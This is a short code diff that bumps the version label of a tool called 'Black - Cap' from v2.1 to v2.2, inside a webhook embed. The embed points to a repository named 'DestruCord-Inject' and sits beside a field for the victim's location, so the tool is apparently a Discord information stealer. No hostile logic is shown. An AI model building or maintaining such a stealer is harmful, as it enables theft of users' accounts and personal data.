@@ -990,7 +990,7 @@ GoogleMaps: {self.googlemap}
             'embeds': [
                 {
                     'author': {
-                        'name': f'Black - Cap v2.1',
+                        'name': f'Black - Cap v2.2',
                         'url': 'https://github.com/KSCHdsc',
                         'icon_url': 'https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif'
                     },
